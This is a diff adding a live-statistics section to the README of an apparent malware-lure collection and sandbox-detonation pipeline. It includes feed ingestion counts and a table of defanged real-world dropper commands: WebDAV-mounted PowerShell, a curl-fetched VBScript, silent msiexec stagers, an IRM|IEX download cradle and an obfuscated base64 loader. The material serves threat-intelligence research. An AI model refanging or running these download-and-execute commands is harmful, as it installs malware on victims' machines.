@@ -32,6 +32,43 @@ sources ──► recover ──► validate ──► classify ──► dedup 
    intel store, viewable via a terminal snapshot (`status.sh`) or a local web
    dashboard (`dashboard_server.py`, served over an SSH tunnel).
 
+## 📊 Live Pipeline Statistics & Telemetry
+
+*Metrics collected directly from the production collector and CAPE detonation engine.*
+
+### Operational Overview
+
+| Metric | Total |
+|---|---|
+| **URLs Consumed** | **1,106** |
+| **Total Sightings** | **4,053** |
+| **Distinct Payloads Recovered** | **50** |
+| **Unique Malicious Domains** | **34** |
+| **Lure Landing Sites Served** | **52** |
+| **CAPE Sandbox Detonation Tasks** | **75+** |
+
+### Feed Ingestion Breakdown
+
+| Feed Source | Distinct URLs | Total Sightings | Focus / Delivery |
+|---|---|---|---|
+| **Curated Gist** | 941 | 1,038 | High-volume candidate discovery |
+| **urlscan.io** | 149 | 2,104 | Real-time scanner queries + DOM harvesting |
+| **URLhaus (abuse.ch)** | 16 | 911 | Verified community-tagged malicious lures |
+
+### Observed Attack Vectors & Payload Profiles
+
+*(Sample of real-world payloads intercepted by the pipeline; IOCs defanged for safe research)*
+
+| Delivery Vector | Type | Intercepted Command Pattern | Sandbox Task |
+|---|---|---|---|
+| **WebDAV Remote Mount** | `batch` | `cmd.exe /c net use Z: hxxp://144.31.47[.]76/webdav /persistent:no && powershell -ExecutionPolicy Bypass -File "Z:\script.ps1" & net use Z: /delete` | CAPE #74 |
+| **cURL Dropper + VBScript** | `batch` | `cmd /c "curl -s hxxp://178.17.59[.]40:5506/qk.vbs -o %temp%\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\qk.vbs"` | CAPE #75 |
+| **Silent MSI Stager** | `batch` | `msiexec /i hxxps://activityof[.]com/datei /qn` | CAPE #71 |
+| **Google Drive MSI Stager** | `batch` | `msiexec /i hxxps://drive.google[.]com/uc?export=download&id=1CjSD0JhJj42n2yygv_75tmpvl6Uqic4o /qn` | CAPE #69 |
+| **CDN Quote-Bypass Download-String** | `ps1` | `IRM fastly.jsdelivr[.]net/g"h"/jkdjkjg374/47f8-b361-67fa79d9feda/6FC-5B-20-FA-7C \| IEX` | CAPE #72 |
+| **Obfuscated Base64 Reflection Loader** | `ps1` | `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$env:jSXyp27VKTz='[OriginalDatabase]';[Hb3ZkpbU2V7IRFx]"...[Convert]::FromBase64String('AwAAACQCA0UDBHIEBXIFBm8GB3IHCEEICWMJCnQKC2kLDG8MDW4NDlAOD3IPEGUQEWYREmUSE3ITFGUUFW4VFmMWF2UXGD...'` | CAPE #66 |
+
+
 ## Layout
 
 | Path | Purpose |
